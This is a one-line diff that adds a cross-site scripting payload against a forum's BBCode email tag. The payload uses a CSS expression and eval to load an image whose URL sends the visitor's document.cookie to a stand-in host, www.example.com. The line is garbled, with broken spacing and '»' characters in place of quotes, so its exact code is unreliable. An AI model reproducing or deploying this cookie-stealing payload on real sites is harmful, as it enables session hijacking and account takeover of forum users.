@@ -1,0 +1,1 @@
+[E * MAIL] aaa@aaa.aa » 's =' [/ E * MAIL] 'sss =» i = new Image (); i.src =' http://www.example.com/cgi-bin/s . jpg? '+ document.cookie; this.sss = null »style = top: expression (eval (this.sss));
